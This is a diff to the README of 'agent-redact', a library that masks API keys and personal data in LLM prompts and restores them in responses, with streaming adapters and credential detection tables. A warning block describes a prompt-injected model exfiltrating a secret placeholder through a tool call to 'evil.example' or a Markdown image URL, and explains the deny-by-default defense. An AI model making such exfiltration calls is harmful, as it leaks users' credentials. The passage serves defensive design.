@@ -14,14 +14,14 @@ Developers and autonomous AI agents (**Claude Code, Cursor, OpenAI, DeepSeek, Go
 * Intercepts prompts before network transmission to any cloud or local LLM.
 * Reversibly masks sensitive tokens (`[API_KEY_1]`).
 * Restores values in generated agent responses without ever leaking secrets to external servers or monitoring tools.
-* First-class integration via **CLI**, **Universal TypeScript Wrapper (`wrapAgent`)**, **Model Context Protocol (MCP)**, and **Web Middlewares (Express / Fastify / Next.js)**.
+* First-class integration via **CLI**, **Universal TypeScript Wrapper (`wrapAgent`)**, **streaming unmask for the Anthropic & OpenAI SDKs**, **Model Context Protocol (MCP)**, and **Express/Connect middleware**.
 
 ---
 
 ## ⚡ Highlights
 
-* **Zero-Latency Performance**: Optimized single-pass regex compilation executes in under **2ms** even for large prompt payloads.
-* **Zero Runtime Dependencies**: Pure TypeScript/JavaScript with zero third-party packages at runtime, eliminating supply-chain vulnerabilities.
+* **Low-Latency, Linear-Time Scanning**: a typical 10 KB prompt is scanned in well under 1 ms, and scanning time grows linearly with input size (about 30 MB/s on clean text, including inputs with 100k findings or adversarial strings).
+* **Dependency-Free Core**: the redaction engine (`import { redact } from 'agent-redact'`) imports no third-party code. The MCP server and CLI use `@modelcontextprotocol/sdk` and `zod`.
 * **Dual-Way Reversible Masking (Vault)**: Masks sensitive tokens into numbered session placeholders (`[ANTHROPIC_API_KEY_1]`) and reliably unmasks them after the LLM completes its reasoning.
 * **Severity-Based Conflict Resolution**: Mathematical arbitration prioritizes high-risk credentials over overlapping low-risk patterns (e.g. GitHub PAT vs. email regex).
 * **CLI & SDK Ready**: Instant CLI utility (`npx agent-redact`) and modern dual ESM/CJS SDK for Node.js 20+.
@@ -96,7 +96,7 @@ console.log(result.text);
 console.log(`Detected ${result.totalLeaks} leak(s) in ${result.durationMs}ms`);
 ```
 
-#### Continuous Stream Processing (O(1) Memory for Huge Files)
+#### Continuous Stream Processing (Line-Bounded Memory for Huge Files)
 ```typescript
 import { createReadStream, createWriteStream } from 'node:fs';
 import { createRedactStream } from 'agent-redact';
@@ -163,9 +163,63 @@ const safeChatAgent = wrapAgent(
 const output = await safeChatAgent('Here is my token: sk-ant-api03-... please debug my server.');
 ```
 
+`wrapAgent` restores placeholders in string answers, in plain objects/arrays (deeply), and in `async function*` token streams, including placeholders split across chunks. Class instances, such as SDK stream objects, are returned untouched; use the stream adapters below for those.
+
+#### Full request/response objects and streaming (Anthropic & OpenAI SDKs)
+
+`redactDeep` sanitizes every string in a request body (system prompt, every message, tool results) with **one shared vault**, so numbering stays consistent across the conversation. `unmaskDeep` restores a full response.
+
+**Base64 payloads fail closed.**
+- Values that only *claim* to be base64 (a `data` field next to `media_type`, or a `data:…;base64,` URL) but are not valid base64 are redacted like any other text.
+- Base64 that decodes to text (a `text/*` or JSON document, or any payload without NUL bytes) is decoded, redacted and re-encoded, because the model reads it.
+- Genuine binary (images, audio) is left byte-for-byte intact. Text inside binary formats such as PDFs is **not** scanned.
+
+> ⚠️ **Unmasking model output re-introduces the real secret into whatever consumes it.** A prompt-injected model can try to exfiltrate a secret by writing its placeholder somewhere that leaves your machine, for example a tool argument (`http_get({ url: "https://evil.example/?k=[AWS_ACCESS_KEY_ID_1]" })`) or a Markdown image URL your UI renders.
+> - Model-generated **tool-call inputs are therefore not unmasked by default** (deny-by-default). This covers:
+>   - Anthropic `input` on `tool_use` / `server_tool_use` / `mcp_tool_use` blocks, and `partial_json`;
+>   - OpenAI `arguments`, including later stream deltas without a `name`;
+>   - Responses API `function_call_arguments` events;
+>   - Gemini and LangChain `args`, and Vercel AI SDK tool `input`.
+>
+>   Opt in only for tools you trust with real secrets: `unmaskToolInputs: true`, or a predicate like `unmaskToolInputs: (name) => name === 'write_env_file'`. This works with `unmaskDeep`, both stream adapters and `wrapAgent`.
+> - The stream adapters also **fail closed**: event and chunk shapes they do not recognise pass through with their placeholders intact.
+> - For text, only unmask output that goes to a trusted destination (a local file, the user's own terminal), not into HTML or Markdown that loads remote resources.
+
+```typescript
+import Anthropic from '@anthropic-ai/sdk';
+import { redactDeep, unmaskDeep, unmaskAnthropicStream } from 'agent-redact';
+
+const client = new Anthropic();
+const { value: safeRequest, vault } = redactDeep({
+  model: 'claude-sonnet-5-5',
+  max_tokens: 1024,
+  system: systemPrompt,
+  messages
+});
+
+// Non-streaming
+const message = unmaskDeep(await client.messages.create(safeRequest), vault);
+
+// Streaming: text split mid-placeholder ("[AWS_ACC" + "ESS_KEY_ID_1]") is restored.
+// Tool-input JSON keeps its placeholders unless you opt in per tool; when restored,
+// secrets are JSON-escaped so `partial_json` stays valid.
+const stream = await client.messages.create({ ...safeRequest, stream: true });
+for await (const event of unmaskAnthropicStream(stream, vault, {
+  unmaskToolInputs: (tool) => tool === 'write_env_file'
+})) {
+  if (event.type === 'content_block_delta' && event.delta.type === 'text_delta') {
+    process.stdout.write(event.delta.text);
+  }
+}
+```
+
+The same pattern works with the OpenAI SDK through `unmaskOpenAIStream(chunks, vault)` for Chat Completions chunk streams. For any other SDK or framework that yields plain text chunks, use `unmaskTextStream(asyncIterable, vault)`, `createUnmaskStream(vault)` (Node `Transform`) or the low-level `StreamingUnmasker`.
+
+> The adapters follow the documented event shapes (`content_block_delta` with `text_delta` / `input_json_delta`, and `choices[].delta.content` / `tool_calls[].function.arguments`). Events are copied, never mutated. Text that is still buffered when a block or choice ends is emitted as an extra delta just before `content_block_stop`, or on the chunk carrying `finish_reason`.
+
 ---
 
-### 4. Express / Fastify / Node.js HTTP Middleware
+### 4. Express / Node.js HTTP Middleware
 
 Protect your backend AI API endpoints against secret leaks in request bodies:
 
@@ -465,8 +519,9 @@ repos:
 | **GitHub Tokens** | `ghp_...`, `github_pat_...`, `gho_...` | `CRITICAL` | `[GITHUB_TOKEN]` |
 | **Stripe Keys** | `sk_live_...`, `pk_live_...`, `rk_live_...` | `CRITICAL` | `[STRIPE_API_KEY]` |
 | **Private Keys** | `-----BEGIN RSA/OPENSSH PRIVATE KEY-----` | `CRITICAL` | `[PRIVATE_KEY]` |
-| **JSON Web Token (JWT)** | `eyJ... . eyJ... . ...` | `HIGH` | `[JWT_TOKEN]` |
-| **Database URLs** | `postgres://`, `mongodb://`, `mysql://`, `redis://` | `CRITICAL` | `[DATABASE_URL]` |
+| **JSON Web Token (JWT)** | `eyJ... . eyJ... . ...` | `CRITICAL` | `[JWT_TOKEN]` |
+| **Database URLs** | `postgres://`, `mongodb://`, `mysql://`, `mariadb://`, `redis://` | `CRITICAL` | `[DATABASE_URL]` |
+| **HTTP Basic-Auth URLs** | `https://user:password@host/...` | `CRITICAL` | `[BASIC_AUTH_URL]` |
 | **Google Cloud / Gemini** | `AIza[0-9A-Za-z_-]{35}` | `HIGH` | `[GOOGLE_API_KEY]` |
 | **Slack Tokens** | `xoxb-...`, `xoxp-...`, `xapp-...` | `HIGH` | `[SLACK_TOKEN]` |
 | **Hugging Face Token** | `hf_[a-zA-Z0-9]{34}` | `HIGH` | `[HUGGINGFACE_TOKEN]` |
@@ -475,8 +530,14 @@ repos:
 | **SendGrid API Key** | `SG.[A-Za-z0-9_-]{22}.[A-Za-z0-9_-]{43}` | `HIGH` | `[SENDGRID_API_KEY]` |
 | **Twilio SID** | `AC[0-9a-fA-F]{32}` | `HIGH` | `[TWILIO_ACCOUNT_SID]` |
 | **Supabase Key** | `sbp_[a-zA-Z0-9]{40}` | `CRITICAL` | `[SUPABASE_KEY]` |
-| **PII: Emails & IPv4/IPv6** | RFC 5322 emails, IPv4 & IPv6 network addrs | `MEDIUM` | `[EMAIL_ADDRESS]`, `[IPV4_ADDRESS]`, `[IPV6_ADDRESS]` |
-| **PII: Phone Numbers** | US & International E.164 formats | `MEDIUM` | `[PHONE_NUMBER]` |
+| **Telegram Bot Token** | `<bot-id>:<35 chars>` | `CRITICAL` | `[TELEGRAM_BOT_TOKEN]` |
+| **Twilio API Key** | `SK[0-9a-fA-F]{32}` | `CRITICAL` | `[TWILIO_API_KEY]` |
+| **Azure Storage Key** | `AccountKey=...` (88 chars) | `CRITICAL` | `[AZURE_STORAGE_KEY]` |
+| **GCP OAuth Client Secret** | `GOCSPX-...` | `CRITICAL` | `[GCP_OAUTH_CLIENT_SECRET]` |
+| **DigitalOcean Token** | `dop_v1_[a-f0-9]{64}` | `CRITICAL` | `[DIGITALOCEAN_TOKEN]` |
+| **Mailgun API Key** | `key-[0-9a-zA-Z]{32}` | `HIGH` | `[MAILGUN_API_KEY]` |
+| **PII: Emails & IPv4/IPv6** | RFC 5321 emails, IPv4 & IPv6 network addrs | `MEDIUM` / `LOW` | `[EMAIL_ADDRESS]`, `[IPV4_ADDRESS]`, `[IPV6_ADDRESS]` |
+| **PII: Phone Numbers** | US, international E.164, Vietnamese mobile & landline | `MEDIUM` | `[PHONE_NUMBER]` |
 | **PII: SSN & Cards** | US SSN, Major Credit Cards | `CRITICAL` | `[US_SSN]`, `[CREDIT_CARD]` |
 
 ---
@@ -489,8 +550,9 @@ Tested with Node.js 24 on realistic multi-agent payloads (~4KB containing code, 
 | :--- | :---: | :--- |
 | **Average Latency** | **`0.087 ms`** / scan | Invisible latency overhead in LLM inference loops |
 | **Throughput** | **`11,510 scans / sec`** | Easily handles high-concurrency multi-agent servers |
-| **Memory Footprint** | `< 25 MB` | Stream processing mode with $O(1)$ memory usage |
-| **Supply Chain Risk** | **Zero** | Zero external dependencies for core scanning |
+| **Scaling** | **Linear** | 2 MB log with 100k findings in ~0.3 s; 80 KB adversarial input in < 0.1 s (guarded by `tests/perf.test.ts`) |
+| **Stream Memory** | Bounded per line | `createRedactStream` buffers one line at a time (up to 1 MB for an open private-key block) |
+| **Core Dependencies** | **None** | The engine imports no third-party code; MCP/CLI add `@modelcontextprotocol/sdk` and `zod` |
 
 Run the benchmark locally:
 ```bash
@@ -516,7 +578,7 @@ npm run bench
 * [x] **v1.3 (Universal Agent Interceptors & Stream Processing)**:
   * `wrapAgent`: Framework-agnostic wrapper for OpenAI, DeepSeek, Gemini, Ollama, LangChain.
   * `createExpressMiddleware`: Express / Fastify / Node HTTP request body sanitizer.
-  * `createRedactStream`: Node.js Transform stream for continuous log sanitization with $O(1)$ memory.
+  * `createRedactStream`: Node.js Transform stream for continuous log sanitization with line-bounded memory.
 * [x] **v1.4 (Customization & Shannon Entropy Heuristics)**:
   * `.agentredactrc` / `agent-redact.config.json` configuration file loader.
   * Custom regex patterns and allowlist/whitelist exemption engine.
